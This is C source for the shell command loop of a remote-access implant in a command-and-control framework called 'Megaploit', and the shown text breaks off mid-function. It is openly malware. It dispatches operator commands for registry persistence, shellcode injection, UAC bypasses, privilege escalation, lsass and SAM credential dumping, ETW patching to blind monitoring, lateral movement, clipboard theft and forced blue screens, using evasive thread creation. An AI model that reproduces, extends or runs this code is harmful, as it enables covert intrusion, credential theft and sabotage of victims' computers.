/*
 * client/shell.c  --  Shell command-loop for the Megaploit C2 protocol
 * ======================================================================
 * Receives encrypted commands from the C2, dispatches them through the
 * handler table below, and sends encrypted responses back.  Mirrors
 * megaploit/agent/handlers.py for shared verbs.
 *
 * Verb dispatch table
 * -------------------
 *  Each verb is matched with strncmp().  megaploit/core/c_probe.py scans
 *  these strncmp() calls at runtime to discover the full verb set without
 *  hardcoding any string in Python.
 *
 *  Native C handlers (Windows API â€” no child process):
 *    sysinfo           -- OS, hostname, username, arch, CWD
 *    os_info           -- extended OS info (build, install date, uptime)
 *    cd <path>         -- SetCurrentDirectoryA
 *    ls [path]         -- directory listing
 *    ps                -- running process list (PID, name, PPID, arch, user)
 *    kill <pid>        -- TerminateProcess
 *    env [filter]      -- GetEnvironmentStrings dump
 *    getclip           -- OpenClipboard / GetClipboardData
 *    setclip <text>    -- OpenClipboard / SetClipboardData
 *    idle_time         -- GetLastInputInfo
 *    lock_screen       -- LockWorkStation
 *    active_windows    -- EnumWindows
 *    msgbox <t> <m>    -- MessageBoxA (async thread)
 *    upload <name>     -- receive framed file, write to disk
 *    download <path>   -- send "FILE_OK" then the framed file bytes
 *    persist <k> <f>   -- copy EXE to %APPDATA%\<f>, set HKCU Run key
 *    self_destruct     -- remove registry key, schedule EXE deletion, exit
 *
 *  Shell-command fallbacks (cmd.exe / powershell):
 *    users / logged_in / services / scheduled_tasks / installed_software
 *    startup_items / wifi_passwords / hashdump / dns_query / netstat / arp
 *    ifconfig / routes / etw_patch / sandbox_check / cat / mkdir / rm
 *    find_files / file_hash / tail / write_file / chmod / find_writable
 *    find_suid
 *
 *  C-exclusive verbs:
 *    inject <pid> <hex>  -- shellcode injection (NT native API, W^X)
 *    migrate <pid>       -- agent migration (reflective PE load in target)
 *    forceOff()          -- NtSetSystemPowerState + NtShutdownSystem
 *    blueScreen()        -- NtRaiseHardError(STATUS_ASSERTION_FAILURE) BSOD
 *
 *  Not-supported stubs (Python-agent-only features):
 *    screenshot / screenrecord / screen_stream / webcam / record / mic_level
 *    keylog_* / browser_* / reverse_shell / socks5 / portfwd
 *    cred_vault / ssh_harvest / sudo_* / notify / play_sound
 *    forkbomb / living_off_land / zip_download / zip_upload
 *
 *  C-implemented (formerly stubs, now live):
 *    inject_shellcode / dll_inject / uac_bypass / getsystem / token_revert
 *    uac_reg_hijack / uac_dll_hijack / uac_com_hijack / uac_env_expand
 *    clip_watch / open_url / set_wallpaper / mouse_move / type_keys / run_psh
 *
 *  Shell fallback:
 *    <anything else>   -- CreateProcess+pipe fallback; covers remaining shell commands
 */

#include "shell.h"
#include "shell_internal.h"
#include "../core/ntcalls.h"
#include "../inject/inject.h"
#include "../evasion/evasion.h"
#include "../evasion/peb_walk.h"
#include "../evasion/k32_walk.h"
#include "../evasion/obf.h"
#include "../inject/loader.h"
#include "../inject/loader_blob.h"
#include "../evasion/syscall.h"

#ifndef THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER
#define THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER  0x00000004
#endif

/* ══════════════════════════════════════════════════════════════════════════
 * Background job table
 * ══════════════════════════════════════════════════════════════════════════
 *
 * Design
 * ------
 * bg_shell_exec() spawns a Windows thread that runs cmd.exe via CreateProcess,
 * stdout, then stores the result in a slot.  The shell loop thread stays
 * free to receive the next command immediately.
 *
 * Concurrency
 * -----------
 * g_tls_cs  — guards every tls_send_msg() call from any thread so background
 *             threads can push "job done" notifications without racing the
 *             main loop's own sends.
 * g_job_cs  — guards the g_jobs[] table itself.
 *
 * Lifecycle
 * ---------
 *  bg <cmd>          → allocate slot, return job ID immediately, fire thread
 *  jobs              → list all slots (running / done / output size)
 *  job_output <id>   → retrieve accumulated output, free slot
 *  job_kill   <id>   → TerminateProcess on the cmd.exe handle, free slot
 *
 * Job slots are never implicitly freed; the operator must call job_output
 * or job_kill to reclaim them (or wait — all slots full → bg returns error).
 */

#define JOB_MAX        16          /* max concurrent background jobs           */
#define JOB_BUF_LIMIT  (4*1024*1024) /* 4 MB max accumulated output per job   */

typedef enum { JOB_FREE=0, JOB_RUNNING, JOB_DONE } _JobState;

typedef struct {
    volatile _JobState state;
    int                id;
    HANDLE             hThread;       /* worker thread handle — kept open until job freed */
    HANDLE             hProcess;      /* cmd.exe process handle (for job_kill)    */
    char              *output;        /* heap-allocated accumulated stdout        */
    size_t             outLen;
    char               cmd[1024];     /* copy of the command string               */
    TLS_CONTEXT       *volatile pTls; /* shared TLS channel — may be nulled on disconnect */
    volatile BOOL      kill_pending;  /* set by job_kill; worker checks before writing slot */
} _Job;

static _Job            g_jobs[JOB_MAX];
static CRITICAL_SECTION g_job_cs;
static CRITICAL_SECTION g_tls_cs;
static BOOL            g_cs_init = FALSE;

/* Initialise both critical sections (called once from shell_run) */
static void _jobs_init(void)
{
    if (g_cs_init) return;
    InitializeCriticalSection(&g_job_cs);
    InitializeCriticalSection(&g_tls_cs);
    memset(g_jobs, 0, sizeof(g_jobs));
    g_cs_init = TRUE;
}

/* Thread-safe send — wraps tls_send_msg so background threads can use it */
static void _safe_send(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg || !*msg) msg = " ";
    size_t len = strlen(msg);
    EnterCriticalSection(&g_tls_cs);
    tls_send_msg(pTls, (const BYTE *)msg, (DWORD)len);
    LeaveCriticalSection(&g_tls_cs);
}

/* Background worker thread */
static DWORD WINAPI _job_worker(LPVOID param)
{
    _Job *job = (_Job *)param;

    /* Open a new cmd.exe process so we can get its handle for job_kill */
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hReadPipe = NULL, hWritePipe = NULL;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        EnterCriticalSection(&g_job_cs);
        job->state = JOB_DONE;
        LeaveCriticalSection(&g_job_cs);
        return 1;
    }
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES;
    si.hStdOutput  = hWritePipe;
    si.hStdError   = hWritePipe;
    si.hStdInput   = GetStdHandle(STD_INPUT_HANDLE);

    /* Build the full command line: cmd /c <job->cmd> */
    char fullCmd[1200] = {0};
    _snprintf(fullCmd, sizeof(fullCmd) - 1, "cmd /c %s", job->cmd);

    BOOL ok = CreateProcessA(NULL, fullCmd, NULL, NULL, TRUE,
                              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(hWritePipe);   /* parent's copy — must close before read loop */

    if (!ok) {
        CloseHandle(hReadPipe);
        EnterCriticalSection(&g_job_cs);
        job->state = JOB_DONE;
        LeaveCriticalSection(&g_job_cs);
        return 1;
    }

    /* Store the process handle so job_kill can terminate it */
    EnterCriticalSection(&g_job_cs);
    job->hProcess = pi.hProcess;
    LeaveCriticalSection(&g_job_cs);
    CloseHandle(pi.hThread);

    /* Read stdout/stderr until the child exits */
    size_t bufSize = SHELL_RESP_BUF;
    char  *buf     = (char *)malloc(bufSize);
    size_t used    = 0;
    if (buf) {
        char chunk[4096];
        DWORD nRead = 0;
        while (ReadFile(hReadPipe, chunk, sizeof(chunk), &nRead, NULL) && nRead > 0) {
            if (used + nRead + 1 >= bufSize && bufSize < JOB_BUF_LIMIT) {
                bufSize = (bufSize * 2 < JOB_BUF_LIMIT) ? bufSize * 2 : JOB_BUF_LIMIT;
                char *p = (char *)realloc(buf, bufSize);
                if (p) buf = p; else break;
            }
            if (used + nRead < bufSize) {
                memcpy(buf + used, chunk, nRead);
                used += nRead;
            }
        }
        buf[used] = '\0';
    }
    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);

    /* Store result and mark done — but only if job_kill hasn't already freed
     * the slot.  If kill_pending is set, the slot may have been recycled so
     * we must not write back into it; just discard the output instead.       */
    EnterCriticalSection(&g_job_cs);
    if (!job->kill_pending) {
        job->output   = buf;
        job->outLen   = used;
        job->hProcess = NULL;
        job->state    = JOB_DONE;
        buf = NULL;   /* ownership transferred to slot */
    }
    LeaveCriticalSection(&g_job_cs);
    if (buf) free(buf);   /* discarded because kill_pending was set */

    /* Notify C2 that the job finished — only if the session is still live.
     * job->pTls is set to NULL by shell_run on disconnect; guard against
     * the stale-pointer case by reading under the TLS critical section.   */
    EnterCriticalSection(&g_tls_cs);
    TLS_CONTEXT *pNotifyTls = job->pTls;
    if (pNotifyTls) {
        char note[64];
        _snprintf(note, sizeof(note) - 1, "[*] job %d done (%zu bytes)", job->id, used);
        tls_send_msg(pNotifyTls, (const BYTE *)note, (DWORD)strlen(note));
    }
    LeaveCriticalSection(&g_tls_cs);

    return 0;
}

/* ── bg_shell_exec ────────────────────────────────────────────────────────── */
/*
 * Dispatch a shell command as a background job.
 * Returns the job ID immediately so the shell loop stays responsive.
 */
static void _bg_shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    if (!cmd || !*cmd) { _send_str(pTls, "Usage: bg <command>"); return; }

    EnterCriticalSection(&g_job_cs);

    /* Find a free slot */
    _Job *slot = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state == JOB_FREE) { slot = &g_jobs[i]; break; }
    }

    if (!slot) {
        LeaveCriticalSection(&g_job_cs);
        _send_str(pTls, "[-] bg: all job slots occupied (use job_output or job_kill to free)");
        return;
    }

    /* Assign a simple 1-based sequential ID */
    static int g_next_id = 1;
    slot->id      = g_next_id++;
    slot->state   = JOB_RUNNING;
    slot->output  = NULL;
    slot->outLen  = 0;
    slot->hProcess= NULL;
    slot->pTls    = pTls;
    strncpy(slot->cmd, cmd, sizeof(slot->cmd) - 1);
    slot->cmd[sizeof(slot->cmd)-1] = '\0';

    LeaveCriticalSection(&g_job_cs);

    /*
     * Spawn worker via threadpool first (ntdll!TppWorkerThread call-stack).
     * Threadpool path yields no joinable HANDLE — job_kill/job_output just
     * won't be able to wait on the worker thread, which is acceptable.
     * Fallback: PEB-resolved CreateThread (no direct IAT entry).
     */
    if (sc_threadpool_exec((LPTHREAD_START_ROUTINE)_job_worker, slot)) {
        /* Threadpool submitted — mark slot so job_kill skips the WaitForSingleObject */
        slot->hThread = INVALID_HANDLE_VALUE;
    } else {
        slot->hThread = k32_CreateThread(NULL, 0, _job_worker, slot, 0, NULL);
        if (!slot->hThread) {
            EnterCriticalSection(&g_job_cs);
            slot->state = JOB_FREE;
            LeaveCriticalSection(&g_job_cs);
            _send_str(pTls, "[-] bg: thread start failed");
            return;
        }
    }
    /* hThread is INVALID_HANDLE_VALUE (threadpool path) or a real handle.
     * _job_kill / _job_output guard against INVALID_HANDLE_VALUE before
     * calling WaitForSingleObject / CloseHandle.                          */

    char buf[64];
    _snprintf(buf, sizeof(buf) - 1, "[+] bg: job %d started", slot->id);
    _send_str(pTls, buf);
}

/* ── jobs ─────────────────────────────────────────────────────────────────── */
static void _list_jobs(TLS_CONTEXT *pTls)
{
    EnterCriticalSection(&g_job_cs);

    size_t respSz = 512;
    char  *resp   = (char *)malloc(respSz);
    if (!resp) { LeaveCriticalSection(&g_job_cs); _send_str(pTls, "[-] jobs: OOM"); return; }

    int off = _snprintf(resp, respSz - 1, "  %-4s %-8s %s\n  %-4s %-8s %s\n",
                        "ID", "State", "Command",
                        "--", "-----", "-------");
    if (off < 0) off = 0;

    BOOL any = FALSE;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state == JOB_FREE) continue;
        any = TRUE;
        const char *st = (g_jobs[i].state == JOB_RUNNING) ? "RUNNING" : "DONE";
        char line[1100];
        int ll = _snprintf(line, sizeof(line) - 1,
                           "  %-4d %-8s %s  (%zu bytes)\n",
                           g_jobs[i].id, st, g_jobs[i].cmd, g_jobs[i].outLen);
        if (ll > 0) {
            if ((size_t)(off + ll + 1) >= respSz) {
                char *p = (char *)realloc(resp, respSz * 2);
                if (p) { respSz *= 2; resp = p; } else break;
            }
            memcpy(resp + off, line, ll);
            off += ll;
        }
    }

    LeaveCriticalSection(&g_job_cs);

    if (!any) { free(resp); _send_str(pTls, "(no background jobs)"); return; }
    resp[off] = '\0';
    tls_send_msg(pTls, (const BYTE *)resp, (DWORD)off);
    free(resp);
}

/* ── job_output ───────────────────────────────────────────────────────────── */
static void _job_output(TLS_CONTEXT *pTls, const char *args)
{
    int id = atoi(args);
    if (id <= 0) { _send_str(pTls, "Usage: job_output <id>"); return; }

    EnterCriticalSection(&g_job_cs);
    _Job *job = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state != JOB_FREE && g_jobs[i].id == id) { job = &g_jobs[i]; break; }
    }

    if (!job) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[-] job_output: job %d not found", id);
        _send_str(pTls, buf); return;
    }
    if (job->state == JOB_RUNNING) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[*] job %d still running", id);
        _send_str(pTls, buf); return;
    }

    /* Steal the output buffer and free the slot.
     * The worker is DONE, so hThread has already exited — close it now.   */
    char  *out   = job->output;
    size_t outLen= job->outLen;
    HANDLE hTh   = job->hThread;
    job->output  = NULL;
    job->outLen  = 0;
    job->hThread = NULL;
    job->state   = JOB_FREE;
    LeaveCriticalSection(&g_job_cs);

    /* Guard: INVALID_HANDLE_VALUE = threadpool path, nothing to close */
    if (hTh && hTh != INVALID_HANDLE_VALUE) CloseHandle(hTh);

    if (out && outLen > 0)
        tls_send_msg(pTls, (const BYTE *)out, (DWORD)outLen);
    else
        _send_str(pTls, "(no output)");

    free(out);
}

/* ── job_kill ─────────────────────────────────────────────────────────────── */
static void _job_kill(TLS_CONTEXT *pTls, const char *args)
{
    int id = atoi(args);
    if (id <= 0) { _send_str(pTls, "Usage: job_kill <id>"); return; }

    EnterCriticalSection(&g_job_cs);
    _Job *job = NULL;
    for (int i = 0; i < JOB_MAX; i++) {
        if (g_jobs[i].state != JOB_FREE && g_jobs[i].id == id) { job = &g_jobs[i]; break; }
    }

    if (!job) {
        LeaveCriticalSection(&g_job_cs);
        char buf[48]; _snprintf(buf, sizeof(buf)-1, "[-] job_kill: job %d not found", id);
        _send_str(pTls, buf); return;
    }

    HANDLE hProc = job->hProcess;
    HANDLE hTh   = job->hThread;
    job->hProcess = NULL;
    job->hThread  = NULL;
    if (job->output) { free(job->output); job->output = NULL; }

    /*
     * Set kill_pending BEFORE releasing the lock and BEFORE marking FREE.
     * The worker's _job_worker() checks kill_pending under g_job_cs before
     * writing its output pointer back into the slot — so even if the
     * threadpool worker is still running when we release the lock here,
     * it will see kill_pending=TRUE and discard its output rather than
     * writing into a slot that we're about to recycle.
     *
     * The slot is only marked JOB_FREE AFTER we have stopped the child
     * process (which causes the worker's ReadFile to return immediately),
     * ensuring the slot cannot be recycled while the worker is still
     * writing into it.
     */
    job->kill_pending = TRUE;
    LeaveCriticalSection(&g_job_cs);

    if (hProc) {
        /* Terminating the process unblocks the worker's ReadFile loop,
         * causing it to exit naturally.  Use PEB-resolved TerminateProcess. */
        k32_TerminateProcess(hProc, 1);
        /* Wait for the worker to finish its ReadFile loop and see kill_pending.
         * On the threadpool path hTh == INVALID_HANDLE_VALUE, so we wait on
         * hProc itself — once the child exits, ReadFile returns and the worker
         * completes within milliseconds.                                       */
        if (hTh && hTh != INVALID_HANDLE_VALUE) {
            WaitForSingleObject(hTh, 5000);
        } else {
            /* Threadpool worker: give it up to 500 ms to finish after child exits */
            WaitForSingleObject(hProc, 500);
        }
        CloseHandle(hProc);
    }
    /* For real thread handles: also wait to ensure the thread has exited. */
    if (hTh && hTh != INVALID_HANDLE_VALUE) {
        WaitForSingleObject(hTh, 5000);
        CloseHandle(hTh);
    }

    /* Now safe to mark the slot FREE — worker has stopped (or will see
     * kill_pending and discard any lingering write).                        */
    EnterCriticalSection(&g_job_cs);
    job->kill_pending = FALSE;
    job->state = JOB_FREE;
    LeaveCriticalSection(&g_job_cs);

    char buf[48]; _snprintf(buf, sizeof(buf)-1, "[+] job %d killed", id);
    _send_str(pTls, buf);
}

/*
 * _json_unwrap â€” strip the outer JSON string quotes that send_msg() adds.
 * "sysinfo" â†’ sysinfo   (in-place, returns new length)
 */
static DWORD _json_unwrap(char *pBuf, DWORD cbBuf)
{
    if (cbBuf < 2 || pBuf[0] != '"' || pBuf[cbBuf - 1] != '"')
        return cbBuf;
    DWORD src = 1, dst = 0, end = cbBuf - 1;
    while (src < end) {
        if (pBuf[src] == '\\' && src + 1 < end) {
            char next = pBuf[src + 1];
            if (next == '"' || next == '\\') { pBuf[dst++] = next; src += 2; continue; }
        }
        pBuf[dst++] = pBuf[src++];
    }
    pBuf[dst] = '\0';
    return dst;
}


/* ── Verb dispatch table ─────────────────────────────────────────────────── */
/*
 * Each entry describes one verb.  The dispatch loop below replaces the
 * O(N) sequential strncmp chain for the majority of verbs.
 *
 * Verbs that need special argument handling (ls optional path, ps allowing
 * whitespace, env optional filter, services optional sub-filter, dns_query
 * with sanitisation, the exit/q special cases, forceOff/blueScreen with
 * exact-match, inject/migrate with large hex, exec_bof, stage_load,
 * sandbox_check, and the _NS stubs) remain in the explicit if-else block
 * below and are skipped by the table (verb == NULL sentinel at end).
 *
 * Handler signature: void fn(TLS_CONTEXT *, const char *args)
 *   args = everything after the verb+space separator (may be "").
 *   For no-arg handlers (sysinfo, ps, etc.) the wrapper ignores args.
 *
 * Table field "minlen" is the minimum command length that this entry
 * can match (== strlen(verb) for exact verbs, strlen(verb)+1 for
 * verbs that require a space+argument).
 */

typedef void (*_DispFn)(TLS_CONTEXT *, const char *);

typedef struct {
    const char *verb;       /* verb string (NUL-terminated)             */
    int         vlen;       /* strlen(verb)                             */
    int         need_arg;   /* 1 = require trailing space + argument    */
    _DispFn     fn;         /* handler function                         */
} _DispEntry;

/* Wrapper helpers for no-arg handlers */
static void _w_sysinfo       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_sysinfo(t); }
static void _w_os_info       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_os_info(t); }
static void _w_ps            (TLS_CONTEXT *t, const char *a) { (void)a; _handle_ps(t); }
static void _w_idle_time     (TLS_CONTEXT *t, const char *a) { (void)a; _handle_idle_time(t); }
static void _w_lock_screen   (TLS_CONTEXT *t, const char *a) { (void)a; _handle_lock_screen(t); }
static void _w_active_windows(TLS_CONTEXT *t, const char *a) { (void)a; _handle_active_windows(t); }
static void _w_getclip       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_getclip(t); }
static void _w_netstat       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_netstat(t); }
static void _w_arp           (TLS_CONTEXT *t, const char *a) { (void)a; _handle_arp(t); }
static void _w_ifconfig      (TLS_CONTEXT *t, const char *a) { (void)a; _handle_ifconfig(t); }
static void _w_routes        (TLS_CONTEXT *t, const char *a) { (void)a; _handle_routes(t); }
static void _w_wifi_passwords(TLS_CONTEXT *t, const char *a) { (void)a; _handle_wifi_passwords(t); }
static void _w_etw_patch     (TLS_CONTEXT *t, const char *a) { (void)a; etw_patch(); _send_str(t, "[+] etw_patch: EtwEventWrite patched (RET stub)"); }
static void _w_dump_lsass    (TLS_CONTEXT *t, const char *a) { (void)a; _handle_dump_lsass(t); }
static void _w_token_revert  (TLS_CONTEXT *t, const char *a) { (void)a; _handle_token_revert(t); }
static void _w_getsystem     (TLS_CONTEXT *t, const char *a) { (void)a; _handle_getsystem(t); }
static void _w_clip_watch    (TLS_CONTEXT *t, const char *a) { (void)a; _handle_clip_watch(t); }
static void _w_self_destruct (TLS_CONTEXT *t, const char *a) { (void)a; _handle_self_destruct(t); }
static void _w_jobs          (TLS_CONTEXT *t, const char *a) { (void)a; _list_jobs(t); }
static void _w_wifi_pw       (TLS_CONTEXT *t, const char *a) { (void)a; _handle_wifi_passwords(t); }
/* Shell-exec wrappers */
static void _w_users         (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "net user"); }
static void _w_logged_in     (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "query user 2>&1"); }
static void _w_schtasks      (TLS_CONTEXT *t, const char *a) { (void)a; _shell_exec(t, "schtasks /query /fo LIST 2>&1"); }
static void _w_find_suid     (TLS_CONTEXT *t, const char *a) {
    (void)a;
    _shell_exec(t,
        "echo [*] No SUID on Windows. Services with non-Windows paths: & "
        "sc query state= all 2>&1 | findstr /i \"SERVICE_NAME\" & "
        "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\" /s /v ImagePath"
        " 2>&1 | findstr /i /v \"system32 syswow64 DriverStore\"");
}

/* Simple arg-forwarding wrappers */
static void _w_kill          (TLS_CONTEXT *t, const char *a) { _handle_kill(t, a); }
static void _w_setclip       (TLS_CONTEXT *t, const char *a) { _handle_setclip(t, a); }
static void _w_msgbox        (TLS_CONTEXT *t, const char *a) { _handle_msgbox(t, a); }
static void _w_upload        (TLS_CONTEXT *t, const char *a) { _handle_upload(t, a); }
static void _w_download      (TLS_CONTEXT *t, const char *a) { _handle_download(t, a); }
static void _w_persist       (TLS_CONTEXT *t, const char *a) { _handle_persist(t, a); }
static void _w_cd            (TLS_CONTEXT *t, const char *a) { _handle_cd(t, a); }
static void _w_token_imp     (TLS_CONTEXT *t, const char *a) { _handle_token_impersonate(t, a); }
static void _w_uac_bypass    (TLS_CONTEXT *t, const char *a) { _handle_uac_bypass(t, a); }
static void _w_uac_reg       (TLS_CONTEXT *t, const char *a) { _handle_uac_reg_hijack(t, a); }
static void _w_uac_dll       (TLS_CONTEXT *t, const char *a) { _handle_uac_dll_hijack(t, a); }
static void _w_uac_com       (TLS_CONTEXT *t, const char *a) { _handle_uac_com_hijack(t, a); }
static void _w_uac_env       (TLS_CONTEXT *t, const char *a) { _handle_uac_env_expand(t, a); }
static void _w_lateral_wmi   (TLS_CONTEXT *t, const char *a) { _handle_lateral_wmi(t, a); }
static void _w_lateral_sc    (TLS_CONTEXT *t, const char *a) { _handle_lateral_sc(t, a); }
static void _w_run_psh       (TLS_CONTEXT *t, const char *a) { _handle_run_psh(t, a); }
static void _w_open_url      (TLS_CONTEXT *t, const char *a) { _handle_open_url(t, a); }
static void _w_set_wallpaper (TLS_CONTEXT *t, const char *a) { _handle_set_wallpaper(t, a); }
static void _w_mouse_move    (TLS_CONTEXT *t, const char *a) { _handle_mouse_move(t, a); }
static void _w_type_keys     (TLS_CONTEXT *t, const char *a) { _handle_type_keys(t, a); }
static void _w_bg            (TLS_CONTEXT *t, const char *a) { _bg_shell_exec(t, a); }
static void _w_job_output    (TLS_CONTEXT *t, const char *a) { _job_output(t, a); }
static void _w_job_kill      (TLS_CONTEXT *t, const char *a) { _job_kill(t, a); }
/* Shell-exec arg-forwarding wrappers */
static void _w_chmod         (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+64]={0};
    _snprintf(sc,sizeof(sc)-1,"icacls \"%s\" 2>&1 & echo [!] chmod mapped to icacls on Windows",a);
    _shell_exec(t,sc);
}
static void _w_find_writable (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+64]={0};
    _snprintf(sc,sizeof(sc)-1,"icacls \"%s\" /t 2>&1 | findstr /i \"(W) (M) (F) Everyone Users\"",a);
    _shell_exec(t,sc);
}
static void _w_file_hash     (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+32]={0};
    _snprintf(sc,sizeof(sc)-1,"certutil -hashfile \"%s\" SHA256 2>&1",a);
    _shell_exec(t,sc);
}
static void _w_mkdir         (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+10]={0};
    _snprintf(sc,sizeof(sc)-1,"mkdir \"%s\" 2>&1",a);
    _shell_exec(t,sc);
}
static void _w_cat           (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+8]={0};
    _snprintf(sc,sizeof(sc)-1,"type \"%s\" 2>&1",a);
    _shell_exec(t,sc);
}
static void _w_rm            (TLS_CONTEXT *t, const char *a) {
    char sc[MAX_PATH+48]={0};
    _snprintf(sc,sizeof(sc)-1,
        "if exist \"%s\\\" (rmdir /s /q \"%s\" 2>&1) else (del /f /q \"%s\" 2>&1)",
        a,a,a);
    _shell_exec(t,sc);
}
static void _w_hashdump      (TLS_CONTEXT *t, const char *a) {
    (void)a;
    _shell_exec(t, "reg save HKLM\\SAM %TEMP%\\sam.hiv /y 2>&1");
    _shell_exec(t, "reg save HKLM\\SYSTEM %TEMP%\\sys.hiv /y 2>&1");
    _send_str(t,
        "[*] hashdump: if no errors above, pull with:\n"
        "    download %TEMP%\\sam.hiv\n"
        "    download %TEMP%\\sys.hiv\n"
        "    (Requires SeBackupPrivilege — run getsystem first if denied)");
}
static void _w_installed_sw  (TLS_CONTEXT *t, const char *a) {
    (void)a;
    _shell_exec(t,
        "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
        " /s /v DisplayName 2>&1 & "
        "reg query \"HKLM\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\""
        " /s /v DisplayName 2>&1");
}
static void _w_startup_items (TLS_CONTEXT *t, const char *a) {
    (void)a;
    _shell_exec(t,
        "reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1 & "
        "reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" 2>&1");
}
static void _w_inject        (TLS_CONTEXT *t, const char *a) { inject_shellcode(t, a); }

/*
 * Dispatch table — searched O(N) but N is now constant and the function
 * pointer call replaces the strncmp body, making the code much shorter.
 * Entries with need_arg=0 match "verb" or "verb " (exact or with space).
 * Entries with need_arg=1 only match "verb " (must have argument).
 * The sentinel {NULL,0,0,NULL} ends the table.
 */
static const _DispEntry _dispatch[] = {
    /* verb              vlen need_arg  handler */
    { "sysinfo",         7,   0,  _w_sysinfo        },
    { "os_info",         7,   0,  _w_os_info        },
    { "cd ",             2,   1,  _w_cd             },  /* "cd " requires space */
    { "ps",              2,   0,  _w_ps             },
    { "kill ",           4,   1,  _w_kill           },
    { "setclip ",        7,   1,  _w_setclip        },
    { "idle_time",       9,   0,  _w_idle_time      },
    { "lock_screen",    11,   0,  _w_lock_screen    },
    { "active_windows", 14,   0,  _w_active_windows },
    { "msgbox ",         6,   1,  _w_msgbox         },
    { "upload ",         6,   1,  _w_upload         },
    { "download ",       8,   1,  _w_download       },
    { "persist ",        7,   1,  _w_persist        },
    { "self_destruct",  13,   0,  _w_self_destruct  },
    { "getclip",         7,   0,  _w_getclip        },
    { "netstat",         7,   0,  _w_netstat        },
    { "arp",             3,   0,  _w_arp            },
    { "ifconfig",        8,   0,  _w_ifconfig       },
    { "routes",          6,   0,  _w_routes         },
    { "wifi_passwords", 14,   0,  _w_wifi_passwords },
    { "etw_patch",       9,   0,  _w_etw_patch      },
    { "dump_lsass",     10,   0,  _w_dump_lsass     },
    { "token_revert",   12,   0,  _w_token_revert   },
    { "getsystem",       9,   0,  _w_getsystem      },
    { "clip_watch",     10,   0,  _w_clip_watch     },
    { "token_impersonate ", 18, 1, _w_token_imp     },
    { "uac_bypass",     10,   0,  _w_uac_bypass     },
    { "uac_reg_hijack", 14,   0,  _w_uac_reg        },
    { "uac_dll_hijack", 14,   0,  _w_uac_dll        },
    { "uac_com_hijack", 14,   0,  _w_uac_com        },
    { "uac_env_expand", 14,   0,  _w_uac_env        },
    { "lateral_wmi ",   11,   1,  _w_lateral_wmi    },
    { "lateral_sc ",    10,   1,  _w_lateral_sc     },
    { "run_psh ",        7,   1,  _w_run_psh        },
    { "open_url ",       8,   1,  _w_open_url       },
    { "set_wallpaper ",  13,  1,  _w_set_wallpaper  },
    { "mouse_move ",    10,   1,  _w_mouse_move     },
    { "type_keys ",      9,   1,  _w_type_keys      },
    { "bg ",             2,   1,  _w_bg             },
    { "jobs",            4,   0,  _w_jobs           },
    { "job_output ",    10,   1,  _w_job_output     },
    { "job_kill ",       8,   1,  _w_job_kill       },
    { "users",           5,   0,  _w_users          },
    { "logged_in",       9,   0,  _w_logged_in      },
    { "scheduled_tasks",15,   0,  _w_schtasks       },
    { "installed_software",18,0,  _w_installed_sw   },
    { "startup_items",  13,   0,  _w_startup_items  },
    { "hashdump",        8,   0,  _w_hashdump       },
    { "cat ",            3,   1,  _w_cat            },
    { "mkdir ",          5,   1,  _w_mkdir          },
    { "rm ",             2,   1,  _w_rm             },
    { "file_hash ",      9,   1,  _w_file_hash      },
    { "chmod ",          5,   1,  _w_chmod          },
    { "find_writable ",  13,  1,  _w_find_writable  },
    { "find_suid",       9,   0,  _w_find_suid      },
    { "inject ",         6,   1,  _w_inject         },
    { "inject_shellcode ", 16, 1, _w_inject         },  /* alias for inject */
    { NULL, 0, 0, NULL }
};

/*
 * _dispatch_verb
 * --------------
 * Search the dispatch table for a matching verb.
 * Returns TRUE and calls the handler if found; FALSE if not matched.
 *
 * Matching rules:
 *   need_arg=0: cmd must start with verb AND (cbCmd == vlen OR cmd[vlen] is space/CR/LF)
 *   need_arg=1: cmd must start with verb (which already ends in ' ') and cbCmd > vlen;
 *               the handler receives cmd+vlen as its args pointer.
 */
static BOOL _dispatch_verb(TLS_CONTEXT *pTls, const char *cmd, DWORD cbCmd)
{
    for (const _DispEntry *e = _dispatch; e->verb; e++) {
        if ((DWORD)e->vlen > cbCmd) continue;
        if (strncmp(e->verb, cmd, (size_t)e->vlen) != 0) continue;

        if (e->need_arg) {
            /* verb ends with ' ' — require at least one char after it */
            if (cbCmd <= (DWORD)e->vlen) continue;
            e->fn(pTls, cmd + e->vlen);
        } else {
            /* exact match or followed by whitespace */
